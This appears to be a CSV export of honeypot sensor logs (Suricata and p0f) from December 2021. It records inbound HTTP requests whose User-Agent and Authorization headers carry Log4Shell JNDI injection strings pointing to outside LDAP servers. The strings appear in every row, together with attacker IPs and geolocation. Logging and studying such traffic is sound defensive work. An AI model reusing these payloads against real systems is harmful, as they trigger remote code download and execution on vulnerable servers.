"@timestamp","@version","_id","_index","_score","_type","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","alert.action","alert.category","alert.gid","alert.rev","alert.severity","alert.signature","alert.signature_id",app,"app_proto","cookies.sess_uuid","dest_ip","dest_port","ecs.version","event_type","fatt_http.clientHeaderHash","fatt_http.clientHeaderOrder","fatt_http.requestFullURI","fatt_http.requestMethod","fatt_http.requestURI","fatt_http.requestVersion","fatt_http.userAgent","fileinfo.filename","fileinfo.gaps","fileinfo.magic","fileinfo.md5","fileinfo.sid","fileinfo.size","fileinfo.state","fileinfo.stored","fileinfo.tx_id","flow.bytes_toclient","flow.bytes_toserver","flow.pkts_toclient","flow.pkts_toserver","flow.start","flow_id","geoip.as_org","geoip.asn","geoip.city_name","geoip.continent_code","geoip.country_code2","geoip.country_code3","geoip.country_name","geoip.dma_code","geoip.ip","geoip.latitude","geoip.location","geoip.longitude","geoip.postal_code","geoip.region_code","geoip.region_name","geoip.timezone",handler,"headers.accept","headers.accept-encoding","headers.connection","headers.cookie","headers.from","headers.host","headers.referer","headers.user-agent","headers.x-forwarded-for","host.name","http.accept_encoding","http.accept_language","http.authorization","http.from","http.hostname","http.http_content_type","http.http_method","http.http_port","http.http_refer","http.http_response_body","http.http_response_body_printable","http.http_user_agent","http.length","http.protocol","http.status","http.url","http.via","http.xff","in_iface","input.type","ip_rep",lang,level,"log.file.path","log.offset",message,"messageBadrequestsyntax($jndi","metadata.flowints.http.anomaly.count","metadata.flowints.tls.anomaly.count",method,mod,msg,params,path,payload,"payload_printable",proto,protocol,query,"raw_sig","response_msg.response.message.detection.name","response_msg.response.message.detection.order","response_msg.response.message.detection.type","response_msg.response.message.detection.version","response_msg.response.message.sess_uuid","response_msg.version",sensorID,"src_ip","src_port",status,stream,subject,"t-pot_hostname","t-pot_ip_ext","t-pot_ip_int",tags,timestamp,"tls.ja3.hash","tls.ja3.string","tls.ja3s.hash","tls.ja3s.string","tls.session_resumed","tls.sni","tls.version","tx_id",type,uuid
"2021-12-15T16:12:03.000Z",1,3S7dvn0B5e7x5EYnkFcd,"logstash-p0f-2021.12.15",,"_doc","ce9644ba-4407-4790-a216-9ed605f3b1d6",6774e89ff91d,"ce444089-8950-47de-880d-7e01a7e0c213",6774e89ff91d,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",4443,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,6774e89ff91d,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",48026321,"{""timestamp"": ""2021/12/15 16:12:03"", ""mod"": ""http request"", ""client_ip"": ""195.110.6.48"", ""server_ip"": ""172.16.0.42"", ""client_port"": 58694, ""server_port"": 4443, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2808300507/4443/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2808300507/4443/C}",,,,,,,,"195.110.6.48",58694,,,cli,fortunateworkhorse,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T16:12:03.000Z",1,h8Ldvn0BCXMCNTQLkKz5,"logstash-p0f-2021.12.15",,"_doc","1c82e366-a501-4faa-89c5-9a930a2da558",d5c06704a974,"35064c15-2483-41fb-a866-d82f542f7c36",d5c06704a974,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",4443,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,d5c06704a974,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",18706235,"{""timestamp"": ""2021/12/15 16:12:03"", ""mod"": ""http request"", ""client_ip"": ""195.110.6.48"", ""server_ip"": ""172.16.0.42"", ""client_port"": 60100, ""server_port"": 4443, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2682193288/4443/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2682193288/4443/C}",,,,,,,,"195.110.6.48",60100,,,cli,doubletomato,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T16:11:49.956Z",1,1cLdvn0BCXMCNTQLQajd,"logstash-suricata-2021.12.15",,"_doc","57940f2e-e3c5-42da-9faf-1129b38a9f9c",850ced52b110,"32c6e424-e3f5-4d0d-8cd8-aac6629909c7",850ced52b110,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",4443,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,1539164139260468,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,850ced52b110,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/c/2310558946/4443/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",101384292,"{""timestamp"":""2021-12-15T16:11:49.956388+0000"",""flow_id"":1539164139260468,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""195.110.6.48"",""src_port"":38366,""dest_ip"":""172.16.0.42"",""dest_port"":4443,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/c/2310558946/4443/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"195.110.6.48",38366,,,,alertgemini,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T16:11:49.956388+0000",,,,,,,,0,Suricata,
"2021-12-15T16:11:49.883Z",1,JMLdvn0BCXMCNTQLTKmm,"logstash-suricata-2021.12.15",,"_doc","51386ff1-3762-4b11-b0bd-6296d15a7cbf",57bd53164ca3,"21cfcf09-fa6e-491e-b90e-a1469171bb20",57bd53164ca3,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",4443,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,1924981051465440,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,57bd53164ca3,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/c/2319715482/4443/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",26717463,"{""timestamp"":""2021-12-15T16:11:49.883430+0000"",""flow_id"":1924981051465440,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""195.110.6.48"",""src_port"":60292,""dest_ip"":""172.16.0.42"",""dest_port"":4443,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/c/2319715482/4443/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"195.110.6.48",60292,,,,meresorbet,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T16:11:49.883430+0000",,,,,,,,0,Suricata,
"2021-12-15T16:11:49.000Z",1,tsLdvn0BCXMCNTQLU6nx,"logstash-p0f-2021.12.15",,"_doc","51386ff1-3762-4b11-b0bd-6296d15a7cbf",57bd53164ca3,"21cfcf09-fa6e-491e-b90e-a1469171bb20",57bd53164ca3,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",4443,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,57bd53164ca3,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",20373135,"{""timestamp"": ""2021/12/15 16:11:49"", ""mod"": ""http request"", ""client_ip"": ""195.110.6.48"", ""server_ip"": ""172.16.0.42"", ""client_port"": 60292, ""server_port"": 4443, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2319715482/4443/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2319715482/4443/C}",,,,,,,,"195.110.6.48",60292,,,cli,meresorbet,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T16:11:49.000Z",1,5y7dvn0B5e7x5EYnQVPp,"logstash-p0f-2021.12.15",,"_doc","57940f2e-e3c5-42da-9faf-1129b38a9f9c",850ced52b110,"32c6e424-e3f5-4d0d-8cd8-aac6629909c7",850ced52b110,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",4443,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Ltd. Cypher",42239,Simferopol,EU,UA,UA,Ukraine,,"195.110.6.48","44.9572","{""lon"":34.1108,""lat"":44.9572}","34.1108",10421,43,"Autonomous Republic of Crimea","Europe/Simferopol",,,,,,,,,,,850ced52b110,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",31275377,"{""timestamp"": ""2021/12/15 16:11:49"", ""mod"": ""http request"", ""client_ip"": ""195.110.6.48"", ""server_ip"": ""172.16.0.42"", ""client_port"": 38366, ""server_port"": 4443, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2310558946/4443/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/c/2310558946/4443/C}",,,,,,,,"195.110.6.48",38366,,,cli,alertgemini,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T16:03:29.716Z",1,xC3Vvn0B5e7x5EYno9jX,"logstash-suricata-2021.12.15",,"_doc","2024c884-a194-4633-950c-0c62617862fb",a881cb080aae,"7f0af17a-0900-4f3b-847c-41a3701bec36",a881cb080aae,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",8080,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,1345068091963493,"Choopa, LLC",20473,"Frankfurt am Main",EU,DE,DE,Germany,,"108.61.210.108","50.1155","{""lon"":8.6842,""lat"":50.1155}","8.6842",60313,HE,Hesse,"Europe/Berlin",,,,,,,,,,,a881cb080aae,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/2994790553/8080/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",35952455,"{""timestamp"":""2021-12-15T16:03:29.716698+0000"",""flow_id"":1345068091963493,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""108.61.210.108"",""src_port"":54818,""dest_ip"":""172.16.0.42"",""dest_port"":8080,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/2994790553/8080/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"108.61.210.108",54818,,,,giantmole,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T16:03:29.716698+0000",,,,,,,,0,Suricata,
"2021-12-15T16:03:29.000Z",1,HMLVvn0BCXMCNTQLoy7q,"logstash-p0f-2021.12.15",,"_doc","2024c884-a194-4633-950c-0c62617862fb",a881cb080aae,"7f0af17a-0900-4f3b-847c-41a3701bec36",a881cb080aae,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",8080,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Choopa, LLC",20473,"Frankfurt am Main",EU,DE,DE,Germany,,"108.61.210.108","50.1155","{""lon"":8.6842,""lat"":50.1155}","8.6842",60313,HE,Hesse,"Europe/Berlin",,,,,,,,,,,a881cb080aae,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",36056076,"{""timestamp"": ""2021/12/15 16:03:29"", ""mod"": ""http request"", ""client_ip"": ""108.61.210.108"", ""server_ip"": ""172.16.0.42"", ""client_port"": 54818, ""server_port"": 8080, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/2994790553/8080/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/2994790553/8080/C}",,,,,,,,"108.61.210.108",54818,,,cli,giantmole,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T16:00:40.326Z",1,p5DTvn0B6VkG8jKzDF06,"logstash-suricata-2021.12.15",,"_doc","ce9644ba-4407-4790-a216-9ed605f3b1d6",6774e89ff91d,"ce444089-8950-47de-880d-7e01a7e0c213",6774e89ff91d,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",8080,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,945208772990213,"Choopa, LLC",20473,"Frankfurt am Main",EU,DE,DE,Germany,,"108.61.210.108","50.1155","{""lon"":8.6842,""lat"":50.1155}","8.6842",60313,HE,Hesse,"Europe/Berlin",,,,,,,,,,,6774e89ff91d,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/2808300507/8080/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",53424397,"{""timestamp"":""2021-12-15T16:00:40.326536+0000"",""flow_id"":945208772990213,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""108.61.210.108"",""src_port"":39680,""dest_ip"":""172.16.0.42"",""dest_port"":8080,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/2808300507/8080/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"108.61.210.108",39680,,,,fortunateworkhorse,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T16:00:40.326536+0000",,,,,,,,0,Suricata,
"2021-12-15T16:00:40.106Z",1,sJDTvn0B6VkG8jKzDF1B,"logstash-suricata-2021.12.15",,"_doc","13aa9408-322c-43ae-a814-ed98938bd3a7",30ccdadf8271,"50457cf1-59c1-4d07-9e33-609c2c14ae5f",30ccdadf8271,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",8080,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,769669164722205,"Choopa, LLC",20473,"Frankfurt am Main",EU,DE,DE,Germany,,"108.61.210.108","50.1155","{""lon"":8.6842,""lat"":50.1155}","8.6842",60313,HE,Hesse,"Europe/Berlin",,,,,,,,,,,30ccdadf8271,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/2769703975/8080/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",32691444,"{""timestamp"":""2021-12-15T16:00:40.106681+0000"",""flow_id"":769669164722205,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""108.61.210.108"",""src_port"":48302,""dest_ip"":""172.16.0.42"",""dest_port"":8080,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/2769703975/8080/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"108.61.210.108",48302,,,,satisfiedweakness,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T16:00:40.106681+0000",,,,,,,,0,Suricata,
"2021-12-15T16:00:40.000Z",1,uy3Tvn0B5e7x5EYnDKs9,"logstash-p0f-2021.12.15",,"_doc","ce9644ba-4407-4790-a216-9ed605f3b1d6",6774e89ff91d,"ce444089-8950-47de-880d-7e01a7e0c213",6774e89ff91d,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",8080,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Choopa, LLC",20473,"Frankfurt am Main",EU,DE,DE,Germany,,"108.61.210.108","50.1155","{""lon"":8.6842,""lat"":50.1155}","8.6842",60313,HE,Hesse,"Europe/Berlin",,,,,,,,,,,6774e89ff91d,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",47905843,"{""timestamp"": ""2021/12/15 16:00:40"", ""mod"": ""http request"", ""client_ip"": ""108.61.210.108"", ""server_ip"": ""172.16.0.42"", ""client_port"": 39680, ""server_port"": 8080, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/2808300507/8080/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/2808300507/8080/C}",,,,,,,,"108.61.210.108",39680,,,cli,fortunateworkhorse,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T16:00:40.000Z",1,WZDTvn0B6VkG8jKzCF1c,"logstash-p0f-2021.12.15",,"_doc","13aa9408-322c-43ae-a814-ed98938bd3a7",30ccdadf8271,"50457cf1-59c1-4d07-9e33-609c2c14ae5f",30ccdadf8271,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",8080,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Choopa, LLC",20473,"Frankfurt am Main",EU,DE,DE,Germany,,"108.61.210.108","50.1155","{""lon"":8.6842,""lat"":50.1155}","8.6842",60313,HE,Hesse,"Europe/Berlin",,,,,,,,,,,30ccdadf8271,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",51251826,"{""timestamp"": ""2021/12/15 16:00:40"", ""mod"": ""http request"", ""client_ip"": ""108.61.210.108"", ""server_ip"": ""172.16.0.42"", ""client_port"": 48302, ""server_port"": 8080, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/2769703975/8080/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/2769703975/8080/C}",,,,,,,,"108.61.210.108",48302,,,cli,satisfiedweakness,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T15:57:39.972Z",1,K8HQvn0BCXMCNTQLTNLR,"logstash-suricata-2021.12.15",,"_doc","bfef6616-2b38-4fa6-8e90-ec99ad931ae5",cf47c22e327e,"ddfbf2f0-c8c7-4b2c-8b34-0d09a985408a",cf47c22e327e,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",8080,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,594883311290351,"Choopa, LLC",20473,"Frankfurt am Main",EU,DE,DE,Germany,,"108.61.210.108","50.1155","{""lon"":8.6842,""lat"":50.1155}","8.6842",60313,HE,Hesse,"Europe/Berlin",,,,,,,,,,,cf47c22e327e,,,,,"127.0.0.1",,GET,,,,,"${jndi:ldap://162.55.90.26/2261905984/8080/C}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",35938366,"{""timestamp"":""2021-12-15T15:57:39.972133+0000"",""flow_id"":594883311290351,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""108.61.210.108"",""src_port"":51338,""dest_ip"":""172.16.0.42"",""dest_port"":8080,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""127.0.0.1"",""url"":""/"",""http_user_agent"":""${jndi:ldap://162.55.90.26/2261905984/8080/C}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"108.61.210.108",51338,,,,rawcoast,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied""]","2021-12-15T15:57:39.972133+0000",,,,,,,,0,Suricata,
"2021-12-15T15:57:39.000Z",1,"NpDQvn0B6VkG8jKzTS-B","logstash-p0f-2021.12.15",,"_doc","bfef6616-2b38-4fa6-8e90-ec99ad931ae5",cf47c22e327e,"ddfbf2f0-c8c7-4b2c-8b34-0d09a985408a",cf47c22e327e,filebeat,"7.11.1",,,,,,,,"???",,,"172.16.0.42",8080,"1.6.0",,,,,,,,,,,,,,,,,,,,,,,,"Choopa, LLC",20473,"Frankfurt am Main",EU,DE,DE,Germany,,"108.61.210.108","50.1155","{""lon"":8.6842,""lat"":50.1155}","8.6842",60313,HE,Hesse,"Europe/Berlin",,,,,,,,,,,cf47c22e327e,,,,,,,,,,,,,,,,,,,,log,,none,,"/data/p0f/log/p0f.json",47203447,"{""timestamp"": ""2021/12/15 15:57:39"", ""mod"": ""http request"", ""client_ip"": ""108.61.210.108"", ""server_ip"": ""172.16.0.42"", ""client_port"": 51338, ""server_port"": 8080, ""subject"": ""cli"", ""app"": ""???"", ""lang"": ""none"", ""params"": ""none"", ""raw_sig"": ""1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/2261905984/8080/C}""}",,,,,"http request",,none,,,,,,,"1:Host,User-Agent,Connection=[Close]:Accept,Accept-Encoding,Accept-Language,Accept-Charset,Keep-Alive:${jndi:ldap://162.55.90.26/2261905984/8080/C}",,,,,,,,"108.61.210.108",51338,,,cli,rawcoast,"172.16.0.42","172.16.0.42","[""p0f"",""beats_input_codec_plain_applied""]",,,,,,,,,,P0f,
"2021-12-15T15:55:37.396Z",1,ZpDOvn0B6VkG8jKzag8b,"logstash-suricata-2021.12.15",,"_doc","bfef6616-2b38-4fa6-8e90-ec99ad931ae5",cf47c22e327e,"ddfbf2f0-c8c7-4b2c-8b34-0d09a985408a",cf47c22e327e,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",8983,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,1122554378861308,,,Clifton,NA,US,US,"United States",501,"167.71.175.10","40.8364","{""lon"":-74.1403,""lat"":40.8364}","-74.1403",07014,NJ,"New Jersey","America/New_York",,,,,,,,,,,cf47c22e327e,,,,,"172.16.0.42",,GET,,,,,"${jndi:ldap://45.83.193.150:1389/Exploit}",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",35752723,"{""timestamp"":""2021-12-15T15:55:37.396988+0000"",""flow_id"":1122554378861308,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""167.71.175.10"",""src_port"":33682,""dest_ip"":""172.16.0.42"",""dest_port"":8983,""proto"":""TCP"",""tx_id"":0,""http"":{""hostname"":""172.16.0.42"",""url"":""/"",""http_user_agent"":""${jndi:ldap://45.83.193.150:1389/Exploit}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,,,,,,,,,,TCP,,,,,,,,,,,"167.71.175.10",33682,,,,rawcoast,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied"",""_geoip_lookup_failure""]","2021-12-15T15:55:37.396988+0000",,,,,,,,0,Suricata,
"2021-12-15T15:53:17.266Z",1,lC3Mvn0B5e7x5EYnRzgo,"logstash-suricata-2021.12.15",,"_doc","bfef6616-2b38-4fa6-8e90-ec99ad931ae5",cf47c22e327e,"ddfbf2f0-c8c7-4b2c-8b34-0d09a985408a",cf47c22e327e,filebeat,"7.11.1",,,,,,,,,,,"172.16.0.42",8983,"1.6.0",http,,,,,,,,,,,,,,,,,,,,,,477830395651654,,,Clifton,NA,US,US,"United States",501,"167.71.175.10","40.8364","{""lon"":-74.1403,""lat"":40.8364}","-74.1403",07014,NJ,"New Jersey","America/New_York",,,,,,,,,,,cf47c22e327e,,,"Bearer ${jndi:ldap://45.83.193.150:1389/Exploit}",,"172.16.0.42",,GET,,,,,"curl/7.58.0",0,"HTTP/1.1",200,"/",,,eth0,log,,,,"/data/suricata/log/eve.json",35531804,"{""timestamp"":""2021-12-15T15:53:17.266617+0000"",""flow_id"":477830395651654,""in_iface"":""eth0"",""event_type"":""http"",""src_ip"":""167.71.175.10"",""src_port"":33958,""dest_ip"":""172.16.0.42"",""dest_port"":8983,""proto"":""TCP"",""tx_id"":0,""metadata"":{""flowints"":{""http.anomaly.count"":1}},""http"":{""hostname"":""172.16.0.42"",""url"":""/"",""http_user_agent"":""curl/7.58.0"",""authorization"":""Bearer ${jndi:ldap://45.83.193.150:1389/Exploit}"",""http_method"":""GET"",""protocol"":""HTTP/1.1"",""status"":200,""length"":0}}",,1,,,,,,,,,TCP,,,,,,,,,,,"167.71.175.10",33958,,,,rawcoast,"172.16.0.42","172.16.0.42","[""suricata"",""beats_input_codec_plain_applied"",""_geoip_lookup_failure""]","2021-12-15T15:53:17.266617+0000",,,,,,,,0,Suricata,
